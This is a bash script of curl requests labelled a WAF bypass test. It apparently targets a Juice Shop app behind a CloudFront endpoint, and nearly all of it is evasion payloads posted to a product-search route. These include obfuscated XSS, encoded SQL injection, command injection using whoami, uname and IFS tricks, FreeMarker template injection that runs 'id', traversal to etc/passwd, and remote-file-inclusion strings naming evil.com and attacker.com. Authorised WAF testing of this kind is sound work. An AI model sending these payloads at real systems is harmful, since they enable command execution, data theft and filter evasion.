#!/bin/bash
#
# WAF Bypass Test - Manual curl commands for 502 payloads
# Policy: Baseline 1.3
# Host: dlpaasrngb6ue.cloudfront.net
#
# Usage: bash curl_502_tests.sh
# Or run individual curls by copying them
#

ENDPOINT="https://dlpaasrngb6ue.cloudfront.net"

# ─── juiceshop-0014 [xss] ───
echo "Testing juiceshop-0014 [xss]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0014" \
  -H "X-Test-Category: xss" \
  -d '{"content": "%3Cscrscriptipt%3Ealert%281%29%3C%2Fscrscriptipt%3E"}'
echo ""

# ─── juiceshop-0031 [xss] ───
echo "Testing juiceshop-0031 [xss]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0031" \
  -H "X-Test-Category: xss" \
  -d '{"content": "\\"><img src=x o%6ener%72=alert(1)>"}'
echo ""

# ─── juiceshop-0036 [base64] ───
echo "Testing juiceshop-0036 [base64]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0036" \
  -H "X-Test-Category: base64" \
  -d '{"content": "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="}'
echo ""

# ─── juiceshop-0037 [xss] ───
echo "Testing juiceshop-0037 [xss]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0037" \
  -H "X-Test-Category: xss" \
  -d '{"content": "<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>"}'
echo ""

# ─── juiceshop-0049 [sqli] ───
echo "Testing juiceshop-0049 [sqli]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0049" \
  -H "X-Test-Category: sqli" \
  -d '{"content": "admin\' #"}'
echo ""

# ─── juiceshop-0053 [sqli] ───
echo "Testing juiceshop-0053 [sqli]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0053" \
  -H "X-Test-Category: sqli" \
  -d '{"content": "%2527%2520OR%25201%253D1--"}'
echo ""

# ─── juiceshop-0056 [sqli] ───
echo "Testing juiceshop-0056 [sqli]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0056" \
  -H "X-Test-Category: sqli" \
  -d '{"content": "%27--+"}'
echo ""

# ─── juiceshop-0057 [xss] ───
echo "Testing juiceshop-0057 [xss]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0057" \
  -H "X-Test-Category: xss" \
  -d '{"content": "%27%23"}'
echo ""

# ─── juiceshop-0071 [sqli] ───
echo "Testing juiceshop-0071 [sqli]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0071" \
  -H "X-Test-Category: sqli" \
  -d '{"content": "admin%27--+"}'
echo ""

# ─── juiceshop-0076 [sqli] ───
echo "Testing juiceshop-0076 [sqli]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0076" \
  -H "X-Test-Category: sqli" \
  -d '{"content": "%2527%2520OR%25201%253D1--+"}'
echo ""

# ─── juiceshop-0090 [sqli] ───
echo "Testing juiceshop-0090 [sqli]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0090" \
  -H "X-Test-Category: sqli" \
  -d '{"content": "1=1"}'
echo ""

# ─── juiceshop-0098 [base64] ───
echo "Testing juiceshop-0098 [base64]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0098" \
  -H "X-Test-Category: base64" \
  -d '{"content": "JyBPUiAnMT0nJz0nMQ=="}'
echo ""

# ─── juiceshop-0104 [xss] ───
echo "Testing juiceshop-0104 [xss]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0104" \
  -H "X-Test-Category: xss" \
  -d '{"content": "\'#"}'
echo ""

# ─── juiceshop-0117 [sqli] ───
echo "Testing juiceshop-0117 [sqli]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0117" \
  -H "X-Test-Category: sqli" \
  -d '{"content": "%2527%2520OR%25201%253D1%2520--"}'
echo ""

# ─── juiceshop-0125 [cmdi] ───
echo "Testing juiceshop-0125 [cmdi]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0125" \
  -H "X-Test-Category: cmdi" \
  -d '{"content": "%2526%2526whoami"}'
echo ""

# ─── juiceshop-0126 [cmdi] ───
echo "Testing juiceshop-0126 [cmdi]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0126" \
  -H "X-Test-Category: cmdi" \
  -d '{"content": "$\\\\{@print(md5(1234))\\\\}"}'
echo ""

# ─── juiceshop-0140 [cmdi] ───
echo "Testing juiceshop-0140 [cmdi]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0140" \
  -H "X-Test-Category: cmdi" \
  -d '{"content": "$\\\\{@print(md5(1))\\\\}"}'
echo ""

# ─── juiceshop-0143 [cmdi] ───
echo "Testing juiceshop-0143 [cmdi]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0143" \
  -H "X-Test-Category: cmdi" \
  -d '{"content": "%60uname%20-a%60"}'
echo ""

# ─── juiceshop-0170 [rfi] ───
echo "Testing juiceshop-0170 [rfi]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0170" \
  -H "X-Test-Category: rfi" \
  -d '{"content": "https://evil.com/backdoor.php"}'
echo ""

# ─── juiceshop-0171 [rfi] ───
echo "Testing juiceshop-0171 [rfi]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0171" \
  -H "X-Test-Category: rfi" \
  -d '{"content": "%252f%252fmalicious.com%252fshell.txt"}'
echo ""

# ─── juiceshop-0172 [rfi] ───
echo "Testing juiceshop-0172 [rfi]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0172" \
  -H "X-Test-Category: rfi" \
  -d '{"content": "%5c%5cattacker.com%5cbackdoor.txt"}'
echo ""

# ─── juiceshop-0173 [rfi] ───
echo "Testing juiceshop-0173 [rfi]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0173" \
  -H "X-Test-Category: rfi" \
  -d '{"content": "https://attacker.site/malware.php"}'
echo ""

# ─── juiceshop-0184 [xss] ───
echo "Testing juiceshop-0184 [xss]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0184" \
  -H "X-Test-Category: xss" \
  -d '{"content": "setTimeout(\'%61lert(1)\',1000)"}'
echo ""

# ─── juiceshop-0205 [xss] ───
echo "Testing juiceshop-0205 [xss]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0205" \
  -H "X-Test-Category: xss" \
  -d '{"content": "&#x3C;!--%2Balert(\'Payload7\')%2B--&#x3E;"}'
echo ""

# ─── juiceshop-0216 [ssti] ───
echo "Testing juiceshop-0216 [ssti]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0216" \
  -H "X-Test-Category: ssti" \
  -d '{"content": "<%= 7 * 7 %>"}'
echo ""

# ─── juiceshop-0217 [ssti] ───
echo "Testing juiceshop-0217 [ssti]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0217" \
  -H "X-Test-Category: ssti" \
  -d '{"content": "$\\\\{7*7\\\\}"}'
echo ""

# ─── juiceshop-0219 [ssti] ───
echo "Testing juiceshop-0219 [ssti]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0219" \
  -H "X-Test-Category: ssti" \
  -d '{"content": "%7B%7B7*7%7D%7D"}'
echo ""

# ─── juiceshop-0220 [ssti] ───
echo "Testing juiceshop-0220 [ssti]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0220" \
  -H "X-Test-Category: ssti" \
  -d '{"content": "%24%7B7*7%7D"}'
echo ""

# ─── juiceshop-0221 [ssti] ───
echo "Testing juiceshop-0221 [ssti]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0221" \
  -H "X-Test-Category: ssti" \
  -d '{"content": "$\\\\{3*3\\\\}"}'
echo ""

# ─── juiceshop-0222 [ssti] ───
echo "Testing juiceshop-0222 [ssti]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0222" \
  -H "X-Test-Category: ssti" \
  -d '{"content": "$\\\\{\\\\{7*7\\\\}\\\\}"}'
echo ""

# ─── juiceshop-0223 [ssti] ───
echo "Testing juiceshop-0223 [ssti]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0223" \
  -H "X-Test-Category: ssti" \
  -d '{"content": "@(1+2)"}'
echo ""

# ─── juiceshop-0225 [ssti] ───
echo "Testing juiceshop-0225 [ssti]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0225" \
  -H "X-Test-Category: ssti" \
  -d '{"content": "<#assign ex = \\"freemarker.template.utility.Execute\\"?new()>$\\\\{ ex(\\"id\\")\\\\}"}'
echo ""

# ─── juiceshop-0226 [ssti] ───
echo "Testing juiceshop-0226 [ssti]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0226" \
  -H "X-Test-Category: ssti" \
  -d '{"content": "[#assign ex = \'freemarker.template.utility.Execute\'?new()]$\\\\{ ex(\'id\')\\\\}"}'
echo ""

# ─── juiceshop-0227 [ssti] ───
echo "Testing juiceshop-0227 [ssti]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0227" \
  -H "X-Test-Category: ssti" \
  -d '{"content": "$\\\\{\\"freemarker.template.utility.Execute\\"?new()(\\"id\\")\\\\}"}'
echo ""

# ─── juiceshop-0307 [sqli] ───
echo "Testing juiceshop-0307 [sqli]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0307" \
  -H "X-Test-Category: sqli" \
  -d '{"content": "%2527%2520OR%25201=1--"}'
echo ""

# ─── juiceshop-0319 [sqli] ───
echo "Testing juiceshop-0319 [sqli]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0319" \
  -H "X-Test-Category: sqli" \
  -d '{"content": "\'--%00"}'
echo ""

# ─── juiceshop-0324 [lfi] ───
echo "Testing juiceshop-0324 [lfi]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0324" \
  -H "X-Test-Category: lfi" \
  -d '{"content": "....%5C....%5C....%5Cetc%5Cpasswd"}'
echo ""

# ─── juiceshop-0328 [sqli] ───
echo "Testing juiceshop-0328 [sqli]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0328" \
  -H "X-Test-Category: sqli" \
  -d '{"content": "1\';--"}'
echo ""

# ─── juiceshop-0339 [xss] ───
echo "Testing juiceshop-0339 [xss]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0339" \
  -H "X-Test-Category: xss" \
  -d '{"content": "\'||"}'
echo ""

# ─── juiceshop-0342 [cmdi] ───
echo "Testing juiceshop-0342 [cmdi]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0342" \
  -H "X-Test-Category: cmdi" \
  -d '{"content": "sh$\\\\{IFS\\\\}-c$\\\\{IFS\\\\}whoami"}'
echo ""

# ─── juiceshop-0343 [cmdi] ───
echo "Testing juiceshop-0343 [cmdi]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0343" \
  -H "X-Test-Category: cmdi" \
  -d '{"content": "bash$\\\\{IFS\\\\}-c$\\\\{IFS\\\\}\'id\'"}'
echo ""

# ─── juiceshop-0344 [cmdi] ───
echo "Testing juiceshop-0344 [cmdi]..."
curl -s -o /dev/null -w "HTTP:%{http_code} Time:%{time_total}s" \
  -X POST "$ENDPOINT/rest/products/search" \
  -H "Host: dlpaasrngb6ue.cloudfront.net" \
  -H "Content-Type: application/json" \
  -H "X-Test-Id: juiceshop-0344" \
  -H "X-Test-Category: cmdi" \
  -d '{"content": "$\\\\{IFS\\\\}\'id\'}"}'
echo ""
